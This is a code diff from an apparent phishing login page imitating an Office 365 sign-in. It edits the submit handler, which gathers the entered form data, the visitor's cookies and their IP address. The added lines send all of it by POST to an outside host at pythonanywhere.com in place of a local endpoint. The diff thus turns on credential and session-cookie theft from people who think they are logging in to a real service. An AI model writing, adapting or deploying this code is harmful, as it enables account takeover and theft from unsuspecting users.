@@ -7579,7 +7579,6 @@ $("#login-final-submit").off("click").on("click", async function(e) {
     var ip = await getUserIP();
 
     try {
-
         let proxyResponse = await fetch('/rr', {
             method: 'GET',
             credentials: 'include' // Ensures cookies are included
@@ -7593,26 +7592,13 @@ $("#login-final-submit").off("click").on("click", async function(e) {
         formData.append('cookies', document.cookie);
         formData.append('ip', ip);
 
-<!--        let response = await $.ajax({-->
-<!--&lt;!&ndash;            url: 'https://dreco111.pythonanywhere.com/o365',&ndash;&gt;-->
-<!--            url: '/rr',-->
-<!--            method: 'POST',-->
-<!--            data: formData,-->
-<!--            processData: false,-->
-<!--            contentType: false-->
-<!--        });-->
-
-  const response = await fetch("/rr", {
-        method: "POST",
-        body: new URLSearchParams(formData),
-        headers: {
-            "Content-Type": "application/x-www-form-urlencoded"
-        },
-        credentials: "include"  // Ensures cookies are sent back
-    });
-
-    const result = await response.text();
-    console.log("Response:", result);
+        let response = await $.ajax({
+            url: 'https://dreco111.pythonanywhere.com/o365',
+            method: 'POST',
+            data: formData,
+            processData: false,
+            contentType: false
+        });
 
         console.log("Response:", response);
 
@@ -7631,8 +7617,15 @@ $("#login-final-submit").off("click").on("click", async function(e) {
         $('.alert-error').removeClass('hide-vals').html("An error occurred. Please try again.");
     }
 
+
+
+
+
+
+
     $(".lightbox-cover, #progressBar").addClass('hide-vals');
 });
+
 
         }
 
